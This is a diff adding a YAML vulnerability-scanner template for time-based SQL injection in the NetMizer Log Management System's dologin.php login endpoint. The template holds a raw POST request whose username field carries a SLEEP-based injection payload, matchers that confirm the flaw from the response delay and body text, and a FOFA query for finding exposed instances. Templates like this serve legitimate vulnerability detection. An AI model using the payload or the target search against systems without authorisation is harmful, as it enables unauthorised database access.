@@ -1,0 +1,34 @@
+id: poc-yaml-netmizer-log-ms-dologin-php-sqli
+info:
+  name: NetMizer Log Management System dologin.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: NetMizer Log Management System
+    fofa-query: app="NetMizer-日志管理系统"
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+http:
+  - raw:
+      - |
+        POST /data/login/dologin.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        action=login&username=' OR SLEEP({{t1}})-- qAZp&passwd=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "'success':true"
+      - type: dsl
+        dsl:
+          - contains(gbk_decode(body),"该用户不存在") || contains(body,"该用户不存在")
+          - duration > to_number(t1)
+          - duration < to_number(t2)
